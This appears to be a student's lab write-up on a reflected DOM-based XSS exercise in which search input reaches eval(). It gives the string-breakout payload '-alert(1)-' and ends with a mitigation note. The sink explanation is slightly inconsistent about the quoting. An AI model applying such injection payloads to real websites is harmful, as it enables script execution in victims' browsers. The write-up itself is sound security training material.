# Lab09 - Reflected DOM XSS

## Objective

Exploit a Reflected DOM-Based XSS vulnerability where user-controlled input is reflected into a JavaScript string and later processed by:

```javascript
eval()
```

Execute:

```javascript
alert(1)
```

to solve the lab.

---

# Lab Information

| Field | Value |
|---------|---------|
| Category | DOM-Based XSS |
| Difficulty | Practitioner |
| Vulnerability | Reflected DOM XSS |
| Source | Search Parameter |
| Sink | eval() |
| Platform | PortSwigger |

---

# Vulnerability Overview

The application reflects attacker-controlled input into a JavaScript string.

Later, client-side JavaScript processes this string using:

```javascript
eval()
```

allowing arbitrary JavaScript execution.

---

# Source → Sink Flow

```text
location.search
        ↓
Server Reflection
        ↓
JavaScript String
        ↓
eval()
        ↓
Execution
```

---

# Analysis

## Step 1

Search for:

```text
carry123
```

---

## Step 2

Inspect response source.

---

Observation:

Input appears inside JavaScript.

Example:

```javascript
var searchTerms =
'carry123';
```

---

## Step 3

Search page scripts.

---

Found dangerous sink:

```javascript
eval()
```

---

## Step 4

Determine Context

Input appears inside:

```javascript
JavaScript String Context
```

---

## Step 5

Break Out Of String

Need payload that:

```text
Close String
        ↓
Inject JavaScript
        ↓
Comment Remaining Code
```

---

# Full Payload(s) Used

## Probe Value

```text
carry123
```

---

## Final Payload

```javascript
'-alert(1)-'
```

---

# Why The Payload Works

Original:

```javascript
eval(
'var searchTerms = "' +
userInput +
'"'
);
```

---

Payload:

```javascript
'-alert(1)-'
```

---

Result:

```javascript
''-alert(1)-''
```

---

Execution Flow

```text
Break String
        ↓
alert(1)
        ↓
JavaScript Executes
```

---

# Personal Analysis & Testing Process

## Initial Goal

Determine how search input is processed.

---

## Probe Test

Used:

```text
carry123
```

---

Observed:

```text
Reflection Inside JavaScript
```

---

## Key Observation

Input not rendered directly into HTML.

Instead:

```text
Passed To JavaScript
```

---

## Sink Discovery

Found:

```javascript
eval()
```

---

Immediately suspected:

```text
DOM XSS
```

---

## Exploitation Strategy

Break JavaScript string context.

Inject:

```javascript
alert(1)
```

---

## Result

```javascript
alert(1)
```

executed.

Lab solved.

---

# Mitigation

Avoid:

```javascript
eval()
```

completely.

Use:

```javascript
JSON.parse()
```

or safe alternatives.

---

# Related Theory

- 19-reflected-dom-xss.md
- 21-dom-xss-sinks-cheatsheet.md

---

# Key Learnings

- eval() is one of the most dangerous sinks.
- Reflected DOM XSS often occurs inside JavaScript strings.
- Context breakout is critical.
- Never trust user-controlled data inside eval().